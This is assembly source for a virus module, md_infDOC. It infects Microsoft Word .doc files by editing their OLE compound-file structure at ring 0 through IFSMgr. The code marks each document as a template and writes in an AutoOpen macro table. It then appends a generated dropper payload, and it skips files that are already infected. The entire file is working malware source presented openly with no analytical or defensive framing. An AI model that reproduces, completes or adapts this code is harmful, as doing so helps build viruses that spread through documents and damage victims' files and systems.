; Module: md_infDOC
;
; input:   edx = name
; returns: eax = 1 if ok

ifndef PASS2
include globals.1
else
include globals.2
endif

common_data      segment public byte USE32 'COMMON'
loaded_sector    db 200h dup (?)
common_data      ends

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature

rdsect  macro  nm
        mov    eax, nm
        call   readsect
endm


STD_ENGLISH = 1
INF_TEMPLATES = 0
max_inf_len = 800000

; edx - doc name
infectDOC:
        cmp    initialize, 0
        je     cont
        ret
cont:

        cld

        mov    sect_num, -2                     ; make sure, that first sector will be loaded

        mov    eax, R0_OPENCREATFILE
        mov    esi, edx
        mov    dx, 1                            ; open file if exists
        mov    bx, 2
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO
        jc     inf_error

        mov    doc_handle, eax

        mov    ebx, eax
        mov    eax, R0_GETFILESIZE
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO


        mov    doc_filelen, eax

        test   eax, 1ffh
        jnz    bad_doc_file                     ; if not page aligned may
                                                ; be infected or damaged
        cmp    eax, max_inf_len                 ; test for too long file
        ja     bad_doc_file

        mov    sect_num, 0                      ; do not cache
        rdsect -1

        cmp    word ptr loaded_sector, 0cfd0h   ; signature D0CF
        jne    bad_doc_file
        cmp    dword ptr loaded_sector+44h, -1  ; 2nd fat ptr sector not supported
        jg     bad_doc_file                     ; => max filelen = 852480 ?

        ; copy pointers to fat sector
        lea    esi, loaded_sector+4ch
        lea    edi, fatdir
        mov    ecx, 0dh
        rep    movsd

        mov    eax, dword ptr ds:[loaded_sector+30h]
        mov    upd_sect, eax
        call   readsect                         ; read stream descriptors

        lea    esi, loaded_sector+80h
        lea    edi, s_WordDoc
        mov    ecx, 6
        repe   cmpsd
        je     short valid_stream

        lea    esi, [esi+80h-6*4+4*ecx]

        lea    edi, s_WordDoc
        mov    ecx, 6
        repe   cmpsd
        jne    no_valid_stream

valid_stream:
        lea    edx, dword ptr ds:[esi+78h-6*4]
        mov    upd_length, edx
        mov    eax, dword ptr [edx]
        cmp    eax, 1000h
        jb     bad_doc_file                     ; stream is too small, will be stored in special file
                                                ; unsupported, may be compressed!
        mov    worddoc_len, eax
        mov    eax, dword ptr ds:[esi+74h-6*4]
        mov    worddoc_stream, eax              ; store handle to stream

        call   readsect

        mov    byte ptr inf_type, STD_ENGLISH
        cmp    word ptr loaded_sector, 0A5DCh   ; check if standard version
        je     short worddoc_ok
        jmp    unk_error
worddoc_ok:
;        IF INF_TEMPLATES
;        test   byte ptr [loaded_sector+0ah], 1
;        jnz    unk_error
;        ENDIF
        or     byte ptr [loaded_sector+0ah], 1  ; convert 2 template
        mov    byte ptr modified, 1

        ; append eax sectors
        mov    ecx, (add_length+1ffh) /200h
        call   append_sectors

        ; find last allocated sector of chunk
        mov    ecx, worddoc_len
        mov    eax, worddoc_stream
        sub    ecx, 200h

find_next:
        mov    edx, eax

        call   fat_find_next

        sub    ecx, 200h
        ja     short find_next

        ; connect new sectors with stream
        xchg   eax, ecx
        mov    edx, ecx
        shr    edx, 7
        mov    eax, fatdir[edx*4]
        call   readsect                 ; - read fat sect

        and    ecx, 7fh
        mov    eax, connect2
        mov    dword ptr loaded_sector[ecx*4], eax      ; connect fat chains
        mov    byte ptr modified, 1

        ; compute true stream length

        rdsect worddoc_stream

        mov    eax, worddoc_len
        add    eax, 1ffh
        and    eax, not 1ffh            ; - eax is offset in stream for macro area begin

        mov    dword ptr loaded_sector+118h, eax
        mov    dword ptr loaded_sector+11ch, templ_len
        mov    dword ptr loaded_sector+20h, eax
        add    dword ptr loaded_sector+20h, add_length
        mov    byte ptr modified, 1

        ; relocate data block (don't destroy eax)
        mov    mcr_pos, end_of_template_area-template_area ; macro pos
        add    mcr_pos, eax

        push   eax
        ; flush because buffer with data will be destroyed (generator)
        call   flush
        mov    sect_num, -2
        ; generate dropper
        mov    eax, 1
        mod_call md_gen_drop
        mov    dropper_ptr, eax                 ; store dropper
        mov    dropper_len, ecx                 ; ptr and len

; init dropper
        mov    ebx, ecx

        mov    word ptr append_data+copycnt, bx           ; realdroplen
        mov    ebx, doc_filelen
        add    ebx, add_length
        mov    word ptr append_data+seeklo, bx
        and    word ptr append_data+seeklo, 07fffh
        shr    ebx, 15
        mov    word ptr append_data+seekhi, bx

        pop    eax

        ; modify stream length
        push   eax
        rdsect upd_sect
        pop    eax
        mov    edx, upd_length
        add    eax, add_length
        mov    dword ptr [edx], eax


        call   flush

        ; append data

        mov    eax, R0_WRITEFILE
        mov    ebx, doc_handle
        lea    esi, template_area
        mov    ecx, add_length;+ stub_len       ;realdroplen
        mov    edx, doc_filelen
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        add    edx, ecx
        mov    eax, R0_WRITEFILE
        mov    esi, dropper_ptr                 ; save dropper
        mov    ecx, dropper_len                 ;
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        mov    eax, R0_CLOSEFILE
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO

        mov    eax, -1
        mod_call md_alloc                       ; free buffer with dropper

        mov    eax, 1
        ret



unk_error:
no_valid_stream:
bad_doc_file:
        mov    eax, R0_CLOSEFILE
        mov    ebx, doc_handle
        call   dword ptr Ring0_FileIO           ; VxDCall IFSMgr_Ring0_FileIO
inf_error:
        xor    eax, eax
        ret

append_sectors:
        mov    eax, doc_filelen
        shr    eax, 9
        dec    eax              ; get sector num
        mov    ebx, eax
        lea    edx, [eax+ecx]
        and    ebx, not 7fh
        and    edx, not 7fh
        cmp    edx, ebx
        je     short do_add

        shr    edx, 7-2

        push   eax              ; load first sector
        rdsect -1
        pop    eax

        mov    dword ptr [loaded_sector+edx+4ch], eax   ; allocate this sector as fat sector
        mov    fatdir[edx], eax                         ; update ptrlist too
        mov    byte ptr modified, 1

        inc    eax

do_add:
        mov    connect2, eax
add_loop:
        mov    edx, eax
        shr    edx, 7
        push   eax
        mov    eax, fatdir[edx*4]
        call   readsect
        pop    eax
        mov    edx, eax
        and    edx, 7fh
        inc    eax
        mov    dword ptr loaded_sector[edx*4], eax
        mov    byte ptr modified, 1
        loop   add_loop

        ret

; in:  edx - sector
; out: eax - sector num
fat_find_next:
        mov    eax, edx
        shr    eax, 7
        mov    eax, fatdir[eax*4]
        call   readsect
        and    edx, 7fh
        mov    eax, dword ptr loaded_sector[edx*4]
        ret


; eax - sector num
; nacita takyto sektor
readsect:
        cmp     eax, sect_num
        je      short readsect_done
        pushad
        cmp     byte ptr modified, 0
        je      short rd_new

        push    offset cs:rd_new

; flushni readed sector na disk
; vsetko okrem eax modified

flush:
        push    eax
        ; compute address in file

        mov     edx, sect_num
        inc     edx
        shl     edx, 9

        mov     eax, R0_WRITEFILE               ; - write sector to disk
        mov     ecx, 200h
        lea     esi, loaded_sector
        mov     ebx, doc_handle
        call    dword ptr Ring0_FileIO          ; VxDCall IFSMgr_Ring0_FileIO


        mov     byte ptr modified, 0

        pop     eax
        ret

rd_new:
        ; compute address in file
        mov     sect_num, eax           ; zapamataj si sektor

        inc     eax
        shl     eax, 9
        mov     edx, eax

        mov     eax, R0_READFILE                ; - read sector from disk
        mov     ecx, 200h
        lea     esi, loaded_sector
        mov     ebx, doc_handle
        call    dword ptr Ring0_FileIO          ; VxDCall IFSMgr_Ring0_FileIO


        popad
readsect_done:
        ret

s_WordDoc     db 'W',0,'o',0,'r',0,'d',0,'D',0,'o',0,'c',0,'u',0,'m',0,'e',0,'n',0,'t',0

doc_filelen   dd ?              ; doc file length
doc_handle    dd ?              ; handle 2 doc file
sect_num      dd -2             ; readed sector num
modified      db 0              ; if 1 sector will be flushed before read
;loaded_sector db 512 dup ('-')  ; processed sector [TODO: move to uninitialized data]
fatdir        dd 0dh dup (-1)   ; list of pointers to fat sectors
worddoc_stream dd ?             ; first sector of worddocument stream
inf_type      db ?              ; type of infection
worddoc_len   dd ?              ; length of worddocument stream
file_handle   dd ?              ; file handle (sector pointing to file)
connect2      dd ?              ; start of added fat chain

upd_sect      dd ?              ; sector with stream descriptor
upd_length    dd ?              ; pointer to length

dropper_ptr   dd ?              ; ptr to dropper
dropper_len   dd ?              ; size of dropper

template_area label byte
              db    0ffh        ; template area ID
              ; template customization:
              db    01h         ; ID - macro descriptors
              dw     1          ; 1 macro
              ; macro description
              db    55h         ; ID
              db    00h         ; crypt const
              dw    01h         ; macro ID
              dw    00h         ; name
              dw    00h         ; menu help
              dd    00h         ; ???
mcr_len       dd    macro_length; macro length
              dd    4           ; 0 if deleted
mcr_pos       dd    end_of_template_area-template_area ; macro pos
              ; names (10h table)
              db    10h
              dw    0dh
              db    8, 'AutoOpen' ; macro name
              dw    1
              ; macro Ids (11h table)
              db    11h
              dw    1
              dw    1
              db    8, 'AUTOOPEN',0
              ; end of table
              db    40h

end_of_template_area label byte
templ_len   = end_of_template_area - template_area

append_data   label byte
; tuto musi byt makro, ktore ma byt prilepene
include wbdrop\wbdrop.inc

macro_length = $-append_data
add_length  = macro_length + templ_len


; data that will be dropped
;realdrop     label byte
;include ..\windrop\dropper.inc
;stub_len = $-realdrop
;realdroplen = $-realdrop+MAXBODYLEN

indep_mod       ends

                end

